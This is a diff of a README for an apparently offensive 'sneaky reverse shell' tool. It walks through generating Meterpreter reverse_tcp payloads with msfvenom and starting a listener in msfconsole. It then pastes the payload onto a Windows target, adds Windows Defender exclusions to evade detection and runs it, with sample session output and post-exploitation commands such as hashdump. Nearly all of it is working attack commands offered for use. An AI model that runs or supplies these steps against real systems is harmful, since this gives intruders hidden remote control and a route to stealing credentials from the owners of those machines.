@@ -31,7 +31,7 @@ $sneaky_psname = "sneaky_reverse_shell.ps1"   # Name of your sneaky reverse shel
 ## Usage
 
 # Kali Linux
-1. Press `Ctrl + Alt + t` for open a first Kali Linux terminal and execute **sudo su** and this following commands:
+1. Press `Ctrl + Alt + t` for open a first Kali Linux terminal and execute `sudo su` and this following commands:
 
 ```bash
 cd $lpath
@@ -102,46 +102,38 @@ Add-MpPreference -ExclusionProcess "$sneaky_exename"
 ```powershell
 Get-MpPreference
 ```
- - If after entering the above commands you do not see any newly added rules in Windows Defender, repeat the procedure until they appear. If after some time there are still no changes, then check the launch of the hidden reverse shell with administrator privileges
+ - **Note:** If after entering the above commands you do not see any newly added rules in Windows Defender, repeat the procedure until they appear. If after some time there are still no changes, then check the launch of the hidden reverse shell with administrator privileges
 
 ## Meterpreter Reverse Shell
 
 To use Meterpreter for enhanced functionality:
 
-1. Open a new Kali terminal and execute the following commands:
+1. Open a new Kali terminal 2 and execute `sudo su` and the following commands:
 
 ```bash
-sudo su
 msfvenom -p windows/x64/meterpreter/reverse_tcp --format psh -o $lpath$ps_name lhost=$lhost lport=$lport
-```
-
-2. Create an EXE file for running without a shell in the target:
-
-```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp --format exe -o $lpath$exe_name lhost=$lhost lport=$lport
 ```
+ - This commands creates PS1 file and EXE file for running meterpreter backdoor in the target:
 
-3. Use the provided PowerShell script for pasting in the original Kali shell:
+3. Use the provided PowerShell script for pasting in the first Kali shell. Write `pwsh` and the following commands:
 
-```bash
-pwsh
+```powershell
 ./ps2tcps.ps1 -inputFilePath $lpath$ps_name -outputFilePath $lpathnew$ps_name -newPath "$rpath$ps_name"
 cat $lpathnew$ps_name
 ```
 
-4. Open a new Kali terminal and execute the following commands:
+4. Open a new Kali terminal 3 for msfconsole and execute `sudo su` then `msfconsole` the following commands:
 
-```bash
-sudo su
-msfconsole
+```msfconsol
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
-set lhost 192.168.0.2
-set lport
+set lhost $lhost
+set lport $lport
 exploit
 ```
 
-5. Return to the original Kali shell and paste the content of your Meterpreter script on the target:
+5. Return to the first Kali shell and paste the content from Kali terminal 2 after command `cat $lpathnew$ps_name` of your changed Meterpreter script on the target like that:
 
 ```powershell
 Add-Content -Path $rpath$ps_name -Value 'line1'
@@ -149,13 +141,30 @@ Add-Content -Path $rpath$ps_name -Value 'line2'
 Add-Content -Path $rpath$ps_name -Value 'line3'
 Add-Content -Path $rpath$ps_name -Value 'line4'
 ...
-Add-MpPreference -ExclusionPath '$rpath$ps_name'
-Add-MpPreference -ExclusionPath '$rpath$exe_name'
 ```
 
-6. If successful, you will see a Meterpreter session opened in the msfconsole. Congratulations, you have a full reverse shell on your target.
+6. Paste this commands after execute meterpreter script
+   
+```powershell
+Add-MpPreference -ExclusionPath '$rpath$ps_name'
+Add-MpPreference -ExclusionPath '$rpath$exe_name'
+$rhost$ps_name
+```
 
-## Example Commands
+7. If successful, you will see a Meterpreter session opened in the msfconsole like that.
+
+```msfconsole
+msf6 exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on 192.168.0.2:4444 
+[*] Sending stage (201798 bytes) to 192.168.0.13
+[*] Meterpreter session 2 opened (192.168.0.2:4444 -> 192.168.0.13:49687) at 2024-03-10 16:16:16 +0200
+
+meterpreter > 
+```
+ - Congratulations, you have a full reverse shell on your target.
+
+## Example Commands Meterpreter
 
 Here are some example commands you can use in the Meterpreter shell:
 
@@ -164,5 +173,9 @@ Here are some example commands you can use in the Meterpreter shell:
 - `hashdump`: Retrieve hashes of all users on the target.
 - `background`: Move the current session to the background.
 - `help`: Display a list of available commands and their descriptions.
+
+## Example stay in target system after rebooting
+
+
 
 Feel free to explore and experiment with additional Meterpreter commands for a comprehensive assessment. Happy hacking!
